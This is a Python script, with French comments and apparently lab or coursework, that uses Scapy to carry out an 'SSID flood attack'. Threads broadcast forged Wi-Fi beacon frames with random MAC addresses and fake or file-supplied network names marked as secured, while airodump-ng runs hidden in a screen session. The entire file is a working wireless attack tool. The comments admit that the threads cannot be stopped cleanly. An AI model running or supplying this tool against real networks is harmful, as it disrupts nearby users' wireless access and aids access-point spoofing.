# https://github.com/catalyst256/MyJunk/blob/master/scapy-deauth.py
# /!\L'interface doit être en mode monitor avant d'exécuter le script /!\

import argparse
import time
import names

from faker import Faker
from threading import Thread
from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Elt, Dot11Beacon, sendp

def send_beacon(ssid, mac, iface, run_event):
    while run_event.is_set():
        #Préparation de la frame à envoyer
        netSSID = ssid  #SSID de l'AP à spoof
        dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=mac, addr3=mac) #envoi de la frame en broadcast, la MAC src et la MAC de l'AP sont les mêmes et valeurs bidons
        beacon = Dot11Beacon(cap='ESS+privacy') #Permet à l'AP d'apparaître comme sécurisé
        essid = Dot11Elt(ID='SSID', info=netSSID, len=len(netSSID))

        #build de la frame
        frame = RadioTap()/dot11/beacon/essid

        #envoi de la frame en continu toutes les 0.1 secondes depuis l'interface IFACE_NAME
        sendp(frame, iface=iface, inter=0.100, loop=1)

def main():

    # Passing argument
    parser = argparse.ArgumentParser(prog="Scapy SSID flood attack",
                                    usage="%(prog)s -i wlan0mon -f file.txt",
                                    description="Scapy SSID flood attack",
                                    allow_abbrev=False)

    parser.add_argument("-i", "--Interface", required=True,
                        help="the interface we want to sniff to be on, needs to be set to monitor mode with channel hopping")

    parser.add_argument("-f", "--File", required=False,
                        help="the file containing the title of the SSID to create, one on each line")

    args = parser.parse_args()

    IFACE_NAME = args.Interface
    FILE = args.File
    SSID_to_generate = []

    # Si jamais l'interface est down
    os.system("ifconfig %s up" % IFACE_NAME)
    #Launch airodump-ng en background / screen permet de ne pas afficher sur la console le process passé en argument
    p = subprocess.Popen(['screen','-d','-m','airodump-ng',IFACE_NAME])

    threads = []
    run_event = threading.Event()
    run_event.set()

    # On vérifie si l'argument fichier a été donnée
    # Si c'est le cas on lit le fichier ligne par ligne
    # Si ce n'est pas le cas on invente trop nom
    if FILE is not None:
        f = open(FILE, "r")
        for line in f:
            SSID_to_generate.append(line[:-1]) #Pour enlever le saut de ligne
        f.close()
    else:
        user_input = input("Combien d'AP voulez-vous générer ? \n")
        for i in range(0, int(user_input)):
            SSID_to_generate.append(names.get_first_name())

    # Utilisation de thread pour créer les trames et les envoyer
    faker = Faker()

    for ssid in SSID_to_generate:
        threads.append(threading.Thread(target=send_beacon, args=(ssid, faker.mac_address(), IFACE_NAME, run_event)))

    for t in threads:
        t.start()
        time.sleep(0.5)

    # J'arrive pas a kill les thread et le processus...
    try:
        while 1:
            time.sleep(.1)
    except KeyboardInterrupt:
        print("Attempting")
        p.kill()
        run_event.clear()
        for t in threads:
            t.join()
        print("threads successfully closed")


if __name__ == '__main__':
    main()